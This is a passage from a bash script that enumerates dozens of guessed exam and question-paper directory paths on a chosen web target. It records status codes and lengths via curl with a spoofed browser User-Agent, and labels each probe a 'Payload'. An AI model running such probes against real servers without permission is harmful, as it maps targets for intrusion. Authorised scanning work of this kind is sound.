         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUploadQPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUploadQPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper-Platform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper-Platform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Handling_Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Handling_Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessorQPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessorQPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_HandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_HandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControlAutomation/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControlAutomation/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploaderQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploaderQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Portal-QPBFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Portal-QPBFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Workflow-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Workflow-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSyncExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSyncExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMgmtMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMgmtMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService_QPSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService_QPSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPDatabaseProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPDatabaseProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataOpsQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataOpsQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Processing-ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Processing-ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderDataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderDataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPServicePlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPServicePlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadServiceQPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadServiceQPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataProcessingQPService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataProcessingQPService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_Service/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_Service/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloudDataOps/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloudDataOps/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileUpload-QPMaster/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileUpload-QPMaster/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaperPortal/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaperPortal/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud-DataProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud-DataProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_PTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_PTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile_BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile_BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPProcessing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPProcessing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipeline_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipeline_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQ_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQ_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Suite_QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Suite_QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper_Sync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper_Sync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflow_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflow_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Ops_ExamPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Ops_ExamPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuiteQPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuiteQPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManagerFileUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManagerFileUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P-CloudSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P-CloudSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper-MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper-MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAdmin_BulkUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAdmin_BulkUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataPipelineQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataPipelineQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploaderWorkflow/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploaderWorkflow/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataSync-QPUploader/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataSync-QPUploader/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperBatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperBatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BulkUpload_QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BulkUpload_QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessingHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessingHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

